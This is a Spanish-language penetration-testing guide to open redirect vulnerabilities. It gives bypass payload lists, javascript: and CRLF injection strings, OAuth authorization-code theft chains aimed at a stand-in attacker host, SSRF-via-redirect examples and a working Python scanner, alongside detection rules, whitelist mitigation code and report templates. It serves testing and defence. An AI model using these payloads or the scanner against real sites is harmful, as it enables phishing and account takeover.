# Redirecciones Inseguras (Open Redirect)

## Resumen

Las redirecciones inseguras permiten a un atacante controlar la URL destino a la que es enviado un usuario tras interactuar con funcionalidades de aplicación como login, logout o enlaces compartidos. Pueden explotarse para phishing avanzado, robo de tokens OAuth, bypass de WAF/SSRF, y cadenas con XSS u otras vulnerabilidades. Aplica cuando el usuario puede manipular parámetros, cabeceras o rutas que definen la redirección sin validación adecuada.[^4]

## Contexto

Las pruebas requieren proxy (Burp Suite), navegador moderno, wordlists personalizadas de payloads y, para flujos OAuth/SSO, cuentas controladas en servicios implicados. Los endpoints típicos incluyen login/logout, verificación de email, SSO (OAuth), cambio de idioma, enlaces de ayuda o after-action con parámetros como `redirect=`, `next=`, `url=`, `continue=`, `return=`, `redirect_uri=`. Las aplicaciones modernas implementan validaciones con listas blancas o regex que requieren técnicas de bypass específicas.[^6]

## Metodología

### Identificación de Superficies de Redirección

1. **Mapear endpoints con parámetros de redirección**
   - Rutas con flujos de autenticación: OAuth, SSO, `/auth`, `/login?next=`
   - Callbacks y verificaciones: `/callback?redirect_uri=`, `/verify?return=`
   - Funciones post-acción: logout, cambio configuración, idioma
   - Referencias en código fuente JS/HTML y variables de sesión
2. **Reconocimiento automatizado**[^5]
   - Usar herramientas como `gau`, `waybackurls`, `ParamSpider`
   - Grep por parámetros comunes de redirección
   - Análizar enlaces en emails auto-generados
   - Revisar documentación de APIs públicas
3. **Análisis de validaciones implementadas**[^3]
   - Identificar si usa blacklist vs whitelist
   - Determinar alcance de validación (dominio, scheme, path)
   - Probar encoding y técnicas de obfuscación
   - Evaluar diferencias entre validación server-side vs client-side

### Checklist de Verificación

- [ ]  Identificar parámetros de redirección en todas las funciones de aplicación
- [ ]  Probar dominios externos básicos (`https://atacante.com`)
- [ ]  Testear variantes de bypass (encoding, schemes alternativos, subdominios)
- [ ]  Verificar escalada DOM-based con `javascript:` protocol
- [ ]  Evaluar flujos OAuth/SAML para manipulación de `redirect_uri`[^9]
- [ ]  Probar bypass de WAF con técnicas avanzadas[^11]

## Pruebas Manuales

### Configuración Inicial

Usar Burp Suite para interceptar requests con parámetros de redirección. Configurar servidor controlado para recibir redirects y analizar cabeceras `Location`.

### Casos de Prueba Básicos

**Caso 1: Redirección clásica**

```http
GET /redirect?url=https://atacante.com HTTP/1.1
Host: victima.com
```

**Caso 2: Bypass de blacklist básica**[^3]

```http
# Protocol-less
GET /redirect?url=//atacante.com HTTP/1.1

# Backslash confusion
GET /redirect?url=\\atacante.com HTTP/1.1

# Mixed schemes  
GET /redirect?url=https:atacante.com HTTP/1.1
```

**Caso 3: Bypass de validación de dominio**[^3]

```http
# Subdominio malicioso
GET /redirect?next=https://victima.com.atacante.com HTTP/1.1

# Usuario malicioso con @ 
GET /redirect?url=https://victima.com%40atacante.com HTTP/1.1

# TLD confusion
GET /redirect?url=https://victimacomevil.com HTTP/1.1
```

**Caso 4: Encoding avanzado**[^3]

```http
# URL encoding
GET /redirect?url=%2f%2fatacante.com HTTP/1.1

# Double encoding  
GET /redirect?url=%252f%252fatacante.com HTTP/1.1

# Unicode normalization
GET /redirect?url=https://atacante%E3%80%82com HTTP/1.1
```

### Casos OAuth Específicos[^8]

**OAuth redirect_uri manipulation:**

```http
GET /auth/oauth?redirect_uri=https://atacante.com/callback HTTP/1.1
Host: victima.com
```

**Chained OAuth exploit:**

```http
# 1. Descubrir open redirect en app
GET /redirect?path=https://atacante.com

# 2. Usar redirect en OAuth flow  
GET /auth?redirect_uri=https://victima.com/redirect?path=https://atacante.com
```

### Técnicas DOM-based[^1]

**JavaScript protocol injection:**

```http
GET /redirect?url=javascript:alert(document.domain) HTTP/1.1

# Bypass de filtros JS
GET /redirect?url=jaVa%0AscRipt:prompt(1) HTTP/1.1

# Newline bypass
GET /redirect?url=javascript://something%0Aalert(1) HTTP/1.1
```

### Evidencias Mínimas

- Screenshots de redirección exitosa a dominio atacante
- Cabeceras `Location` mostrando URL controlada
- Logs de servidor atacante recibiendo requests
- Confirmación de escalada (XSS, OAuth takeover, SSRF)

## PoC

### Manual: Redirección Básica

**Objetivo:** Demostrar control sobre destino de redirección

**Pasos:**

1. Identificar endpoint vulnerable: `?redirect=` en victima.com
2. Probar redirección externa: `?redirect=https://atacante.com`
3. Confirmar redirección automática en navegador
4. Documentar cabecera `Location` y comportamiento

**Resultado Esperado:** Usuario redirigido a dominio atacante sin confirmación

### Manual: OAuth Account Takeover[^9]

**Objetivo:** Demostrar robo de authorization code via open redirect

**Pasos:**

1. Identificar open redirect en aplicación OAuth client
2. Crear URL maliciosa combinando OAuth + open redirect
3. Hacer que víctima autenticada acceda a URL maliciosa
4. Capturar authorization code en servidor atacante
5. Usar código para obtener access token de víctima

### Automatizada: Scanner de Open Redirect

```python
import requests
import concurrent.futures
from urllib.parse import urlparse, urlencode
import time

class OpenRedirectScanner:
    """
    Scanner automatizado de vulnerabilidades Open Redirect
    """
  
    def __init__(self, base_urls, attacker_domain="atacante.com"):
        self.base_urls = base_urls if isinstance(base_urls, list) else [base_urls]
        self.attacker_domain = attacker_domain
        self.session = requests.Session()
    
        # Parámetros comunes de redirección
        self.redirect_params = [
            'redirect', 'redirect_url', 'redirect_uri', 'redirectURL',
            'next', 'url', 'return', 'returnUrl', 'continue', 'go',
            'dest', 'destination', 'target', 'to', 'out', 'forward',
            'callback', 'callbackUrl', 'rurl', 'r', 'page'
        ]
    
        # Payloads de bypass avanzados
        self.bypass_payloads = [
            f"https://{attacker_domain}",
            f"//{attacker_domain}",
            f"\\\\{attacker_domain}",
            f"https:{attacker_domain}",
            f"http:{attacker_domain}",
            f"%2f%2f{attacker_domain}",
            f"%5c%5c{attacker_domain}",
            f"https://%40{attacker_domain}",
            f"https://legitimate.com@{attacker_domain}",
            f"https://legitimate.com.{attacker_domain}",
            f"https://{attacker_domain}%23legitimate.com",
            f"https://{attacker_domain}?legitimate.com",
            f"https://{attacker_domain}°legitimate.com",
            f"https://legitimate%E3%80%82{attacker_domain}",
            f"////{attacker_domain}",
            f"javascript:alert('XSS')//{attacker_domain}",
            f"/%0D%0ALocation:%20https://{attacker_domain}",
            f"/%0A/{attacker_domain}",
            f"/%09/{attacker_domain}",
            f"/%2e%2e%2f{attacker_domain}"
        ]
  
    def test_endpoint(self, url, param, payload):
        """
        Prueba un endpoint específico con un payload
        """
        try:
            # Construir URL de prueba
            if '?' in url:
                test_url = f"{url}&{param}={payload}"
            else:
                test_url = f"{url}?{param}={payload}"
        
            # Enviar request sin seguir redirects
            response = self.session.get(
                test_url, 
                allow_redirects=False, 
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0 (OpenRedirect Scanner)'}
            )
        
            # Analizar respuesta
            if self._is_vulnerable_response(response, payload):
                return {
                    'url': test_url,
                    'param': param, 
                    'payload': payload,
                    'status_code': response.status_code,
                    'location_header': response.headers.get('Location', ''),
                    'vulnerability_type': self._classify_vulnerability(response, payload)
                }
            
        except requests.RequestException as e:
            pass
        
        return None
  
    def _is_vulnerable_response(self, response, payload):
        """
        Determina si la respuesta indica vulnerabilidad
        """
        # Verificar códigos de redirección
        if response.status_code not in [301, 302, 303, 307, 308]:
            return False
    
        location = response.headers.get('Location', '').lower()
    
        # Verificar si el payload está en Location header
        payload_lower = payload.lower()
    
        # Normalizar para comparación
        if self.attacker_domain.lower() in location:
            return True
    
        # Verificar payloads de bypass específicos
        if any(indicator in location for indicator in [
            'atacante.com', 'evil.com', 'malicious.com',
            'javascript:', 'alert(', 'prompt('
        ]):
            return True
        
        return False
  
    def _classify_vulnerability(self, response, payload):
        """
        Clasifica el tipo de vulnerabilidad encontrada
        """
        location = response.headers.get('Location', '').lower()
    
        if 'javascript:' in payload.lower() and 'javascript:' in location:
            return 'DOM XSS via Open Redirect'
        elif '%0d%0a' in payload.lower():
            return 'CRLF Injection via Open Redirect'
        else:
            return 'Open Redirect'
  
    def scan_url(self, base_url):
        """
        Escanea una URL base con todos los parámetros y payloads
        """
        vulnerabilities = []
    
        for param in self.redirect_params:
            for payload in self.bypass_payloads:
                vuln = self.test_endpoint(base_url, param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    print(f"[+] Vulnerabilidad encontrada: {vuln['url']}")
            
                # Rate limiting
                time.sleep(0.1)
    
        return vulnerabilities
  
    def discover_redirect_endpoints(self, base_url):
        """
        Descubre endpoints potencialmente vulnerables
        """
        endpoints = []
        common_paths = [
            '/login', '/logout', '/redirect', '/auth', '/callback',
            '/oauth/authorize', '/sso', '/signin', '/signout',
            '/verify', '/confirm', '/return', '/forward'
        ]
    
        for path in common_paths:
            endpoint = f"{base_url.rstrip('/')}{path}"
            try:
                response = self.session.get(endpoint, timeout=5, allow_redirects=False)
                if response.status_code in [200, 302, 301, 400, 403]:
                    endpoints.append(endpoint)
            except:
                continue
    
        return endpoints
  
    def comprehensive_scan(self):
        """
        Escaneo completo de todas las URLs base
        """
        print("[*] Iniciando escaneo comprehensivo de Open Redirect...")
        all_vulnerabilities = []
    
        for base_url in self.base_urls:
            print(f"[*] Escaneando {base_url}...")
        
            # Descubrir endpoints
            endpoints = self.discover_redirect_endpoints(base_url)
            test_urls = [base_url] + endpoints
        
            # Escanear cada endpoint
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                future_to_url = {
                    executor.submit(self.scan_url, url): url 
                    for url in test_urls
                }
            
                for future in concurrent.futures.as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        vulnerabilities = future.result()
                        all_vulnerabilities.extend(vulnerabilities)
                    except Exception as e:
                        print(f"[-] Error escaneando {url}: {e}")
    
        print(f"[*] Escaneo completado. {len(all_vulnerabilities)} vulnerabilidades encontradas")
        return all_vulnerabilities

# Uso del scanner
if __name__ == "__main__":
    # URLs objetivo
    targets = [
        "https://victima.com",
        "https://app.victima.com",
        "https://auth.victima.com"
    ]
  
    scanner = OpenRedirectScanner(targets, "atacante.com")
    vulnerabilities = scanner.comprehensive_scan()
  
    # Generar reporte
    import json
    with open('open_redirect_report.json', 'w') as f:
        json.dump(vulnerabilities, f, indent=2)
  
    # Mostrar resumen
    print(f"\n[*] Resumen de vulnerabilidades:")
    for vuln in vulnerabilities:
        print(f"  - {vuln['vulnerability_type']}: {vuln['url']}")
```

**Script de automatización con herramientas externas:**[^7]

```bash
#!/bin/bash
# Open Redirect hunting automation

# 1. Recopilación de subdominios
subfinder -d victima.com -o subdomains.txt

# 2. Extracción de URLs con parámetros
cat subdomains.txt | gau | grep -E 'redirect|url|next|return' > urls.txt

# 3. Filtrado de parámetros de redirección  
grep -Ei 'url=|next=|redirect=|return=|rurl=|go=' urls.txt > redirect_params.txt

# 4. Testing automatizado con ffuf
ffuf -u 'FUZZ' -w redirect_params.txt -H 'User-Agent: Scanner' -fc 404 -o results.json
```

## Explotación/Automatización

### Variantes Avanzadas de Explotación

**Bypass de WAF con técnicas modernas**[^10]

```python
# Encoding mixto para evadir WAF
payloads = [
    "https://at%61c%61nte.com",  # Character encoding
    "https://ATACANTE.COM",      # Case variation
    "htTpS://atacante.com",      # Mixed case protocol
    "https://%5catacante.com",   # Backslash encoding
]
```

**SSRF via Open Redirect**[^15]

```python
# Usar open redirect para bypass de filtros SSRF
ssrf_payload = "/redirect?url=http://192.168.1.1:8080/admin"
# Server ve URL legítima pero resuelve a IP interna
```

**OAuth Account Takeover Chain**[^8]

```python
# 1. Crear URL maliciosa combinando OAuth + Open Redirect
malicious_oauth_url = f"""
https://auth.provider.com/oauth/authorize?
client_id=victim_app&
redirect_uri=https://victim.com/redirect?url=https://atacante.com/steal&
response_type=code
"""

# 2. Víctima autoriza y código se envía a atacante
# 3. Atacante usa código para account takeover
```

### Herramientas Especializadas[^6]

**OpenRedirector - Tool automatizada:**

```bash
git clone https://github.com/0xKayala/OpenRedirector
echo "https://victima.com" | OpenRedirector -p payloads.txt
```

**Integration en pipelines:**

```bash
# Automatización continua 
echo victima.com | subfinder | httpx | openredirex -p payloads.txt
```

## Impacto

### Escenario Real

Un atacante explota open redirect en aplicación bancaria para crear URLs de phishing convincentes. Combina con OAuth misconfiguration para robar tokens de autenticación de 1,000+ usuarios, obteniendo acceso completo a cuentas bancarias. El uso de dominio trusted incrementa tasa de éxito de phishing al 85%.[^9]

### Mapeo de Seguridad

- **OWASP:** A03:2021 - Injection, A07:2021 - Identification and Authentication Failures
- **CWE:** CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')
- **CVSS v3.1:** Rango típico 3.0-7.0 (Bajo-Alto)[^18]

### Severidad CVSS

Para Open Redirect básico:[^18]

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Puntuación Base: 6.1
```

Para escalada OAuth Account Takeover:[^8]

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Puntuación Base: 8.8
```

## Detección

### Logs de Aplicación

Implementar logging de:

- Requests con parámetros de redirección a dominios externos
- Respuestas 3xx con Location headers sospechosos
- Patrones de encoding anómalo en URLs de redirección
- Flujos OAuth con redirect_uri no whitelisted[^8]

### WAF/Proxy[^11]

Configurar reglas para detectar:

- Patrones de bypass conocidos (`//`, `\\`, `@`, encoding)
- Dominios maliciosos en parámetros de redirección
- Esquemas peligrosos (`javascript:`, `data:`, `vbscript:`)
- CRLF injection attempts (`%0d%0a`)

### Monitoreo Comportamental

Implementar:

- Análisis de destinos de redirección frecuentes
- Detección de anomalías en tasas de redirección externa
- Correlación con ataques de phishing reportados
- Alertas por OAuth flows con redirect_uri sospechosos

## Mitigación

### Fix Principal

Implementar validación estricta con whitelist:

```python
from urllib.parse import urlparse
from flask import request, redirect, abort

# Lista blanca de dominios permitidos
ALLOWED_DOMAINS = ['victima.com', 'app.victima.com', 'auth.victima.com']
ALLOWED_PATHS = ['/dashboard', '/profile', '/settings']

def safe_redirect():
    """
    Redirección segura con validación estricta
    """
    redirect_url = request.args.get('next', '')
  
    if not redirect_url:
        return redirect('/')
  
    # Validar que sea path relativo
    if redirect_url.startswith('/') and not redirect_url.startswith('//'):
        if redirect_url in ALLOWED_PATHS:
            return redirect(redirect_url)
  
    # Si es URL absoluta, validar dominio
    try:
        parsed = urlparse(redirect_url)
        if parsed.netloc.lower() in ALLOWED_DOMAINS:
            return redirect(redirect_url)
    except:
        pass
  
    # Redirección por defecto si falla validación
    return redirect('/')
```

### Controles Específicos OAuth[^8]

```python
import hashlib

def validate_oauth_redirect_uri(redirect_uri, registered_uris):
    """
    Validación estricta de redirect_uri en OAuth
    """
    # Validación exacta contra URIs registradas
    if redirect_uri in registered_uris:
        return True
  
    # Para desenvolvimento, permitir localhost con path específico
    parsed = urlparse(redirect_uri)
    if parsed.hostname == 'localhost' and parsed.path.startswith('/callback'):
        return True
  
    return False

def generate_state_parameter():
    """
    Generar parámetro state para prevenir CSRF
    """
    import secrets
    return secrets.token_urlsafe(32)
```

### Controles Adicionales

1. **Normalización de URLs**[^3]
   - Usar bibliotecas robustas de parsing (no regex custom)
   - Normalizar Unicode y encoding antes de validación
   - Rechazar URLs malformadas
2. **Implementación de CSP**
   - `Content-Security-Policy: frame-ancestors 'self'`
   - Prevenir embedding en sitios maliciosos
3. **Monitoreo continuo**
   - Logs detallados de todas las redirecciones
   - Alertas automáticas por destinos no whitelisted

### Pruebas Post-Fix

- Verificar que solo destinos whitelisted son permitidos
- Probar bypass con encoding, Unicode, case variations
- Confirmar validación tanto server-side como client-side
- Testear OAuth flows con redirect_uri manipulation[^8]

## Errores Comunes

### Falsos Positivos[^17]

- Confundir redirecciones legítimas con vulnerabilidades
- Reportar redirects a dominios relacionados (CDN, subdominios legítimos)
- No confirmar que redirección es automática sin user interaction
- Asumir vulnerabilidad sin probar bypass de validaciones existentes

### Límites de Testing

- Aplicaciones con whitelist estricta bien implementada
- Sistemas que usan identificadores instead of full URLs
- WAFs avanzados con detección de payloads de bypass[^11]
- OAuth providers con validación robusta de redirect_uri

## Reporte

### Título

"Redirección Insegura (Open Redirect) - Control No Autorizado de Destino de Navegación"

### Resumen Ejecutivo

La aplicación permite redirección no autorizada a dominios externos mediante manipulación de parámetros, facilitando ataques de phishing, robo de tokens OAuth y bypass de controles de seguridad.

### Pasos de Reproducción

1. Identificar endpoint con parámetro de redirección: `/login?next=`
2. Modificar parámetro a dominio externo: `?next=https://atacante.com`
3. Confirmar redirección automática sin confirmación del usuario
4. Demostrar escalada (phishing, OAuth takeover, SSRF si aplica)

### Evidencias

- Screenshots de redirección exitosa a dominio atacante
- Análisis de cabeceras HTTP mostrando Location malicioso
- Logs de servidor atacante recibiendo víctimas redirigidas
- Demostración de impacto real (OAuth token theft, phishing success)

### Mitigación Recomendada

Implementar validación estricta con whitelist de destinos permitidos, usar identificadores en lugar de URLs completas, normalizar y validar URLs antes de redirección, y implementar controles específicos para flujos OAuth/SSO.


[^1]: https://www.intigriti.com/researchers/blog/hacking-tools/open-url-redirects-a-complete-guide-to-exploiting-open-url-redirect-vulnerabilities
    
[^2]: https://www.stackhawk.com/blog/what-is-open-redirect/
    
[^3]: https://www.diverto.hr/en/blog/2024-12-30-open-redirection-url-filter-bypasses
    
[^4]: https://www.wallarm.com/what/open-redirect-vulnerability
    
[^5]: https://infosecwriteups.com/how-to-automate-hunting-for-open-redirect-46537cd67b35
    
[^6]: https://spyboy.blog/2025/05/01/the-ultimate-guide-to-finding-open-redirect-vulnerabilities-step-by-step-payloads-tools/
    
[^7]: https://infosecwriteups.com/100-worth-open-redirect-automation-3e2f9e36bade
    
[^8]: https://www.cyberark.com/resources/threat-research-blog/how-secure-is-your-oauth-insights-from-100-websites
    
[^9]: https://systemweakness.com/day-21-full-account-takeover-via-open-redirection-5f3ca7f0c726
    
[^10]: https://infosecwriteups.com/️-how-hackers-bypass-web-application-firewalls-wafs-in-2025-c2a5052044c9
    
[^11]: https://systemweakness.com/8-sneaky-waf-bypass-attempts-hackers-use-in-2025-and-how-safeline-stops-them-cold-f00034239538
    
[^12]: https://gist.github.com/0xblackbird/d7677a05ea50586cf2be0a601e665d1a
    
[^13]: https://infosecwriteups.com/testing-and-bypassing-technique-for-open-redirection-vulnerability-ca1bc6c851c5
    
[^14]: https://www.youtube.com/watch?v=sOrS69P-D8M
    
[^15]: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
    
[^16]: https://github.com/0xKayala/OpenRedirector
    
[^17]: https://cqr.company/web-vulnerabilities/open-redirect/
    
[^18]: https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-24735
    
[^19]: https://pentest-tools.com/vulnerabilities-exploits/grafana-xss-open-redirect-ssrf-via-client-path-traversal_27130
    
[^20]: https://security.snyk.io/vuln/SNYK-RHEL10-AUTOMATIONCONTROLLER-10441889
    
[^21]: https://swisskyrepo.github.io/PayloadsAllTheThings/Open Redirect/
    
[^22]: https://www.invicti.com/blog/web-security/open-redirection-vulnerability-information-prevention/
    
[^23]: https://www.acunetix.com/vulnerabilities/web/grafana-open-redirect-cve-2025-4123/
    
[^24]: https://abnormal.ai/blog/attackers-exploit-open-redirects
    
[^25]: https://www.first.org/cvss/examples
    
[^26]: https://www.first.org/cvss/v3-1/examples
    
[^27]: https://cybercx.co.nz/blog/advanced-open-redirection-vulnerability-discovery/
    
[^28]: https://security.snyk.io/vuln/SNYK-JS-EXPRESS-6474509
    
[^29]: https://waf-bypass.com/2025/06/page/2/
    
[^30]: https://www.youtube.com/watch?v=1Op_fPufvRI
    
[^31]: https://brightdata.com/blog/web-data/bypass-cloudflare
    
[^32]: https://www.radware.com/cyberpedia/application-security/server-side-request-forgery/
    
[^33]: https://dl.acm.org/doi/fullHtml/10.1145/3627106.3627140
    
[^34]: https://hackerone.com/reports/206591
    
[^35]: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
    
[^36]: https://www.linkedin.com/posts/martinmarting_an-interesting-combo-ssrf-and-open-redirect-activity-7343680390290706433-lviV
    
[^37]: https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com
    
[^38]: https://infosecwriteups.com/from-open-redirect-to-internal-access-my-ssrf-exploit-story-10a736962f98
    
[^39]: https://security.tecno.com/SRC/blogdetail/330?lang=en_US
